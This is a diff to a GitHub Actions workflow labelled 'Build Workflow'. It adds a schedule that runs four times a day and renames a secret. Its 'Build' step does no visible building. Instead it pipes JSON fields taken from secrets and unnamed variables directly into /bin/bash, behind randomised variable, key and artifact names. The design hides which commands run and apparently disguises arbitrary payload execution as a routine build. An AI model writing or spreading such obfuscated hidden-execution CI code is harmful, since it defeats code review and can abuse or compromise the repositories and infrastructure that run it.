@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '24 2,8,14,20 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,15 +16,16 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          euuvk529: ${{ secrets.euuvk529 }}
+          wpo8: ${{ secrets.wpo8 }}
         run: |
-          printf '%s' "$euuvk529" | jq -r .qwaxe1 | /bin/bash
-          echo $czva626 | jq -r .bmt581 | /bin/bash
-          printf '%s' "$mjs7" | jq -r .zji54 | /bin/bash
+          printf '%s' "$wpo8" | jq -r .htetu9 | /bin/bash
+          echo $n81625 | jq -r .m113 | /bin/bash
+          echo $chb83 | jq -r .aq4970 | /bin/bash
+          printf '%s' "$vt9506" | jq -r .w76 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: 09V8bPNI
+          name: NZVC03cF
           path: "*.zip"
           retention-days: 1
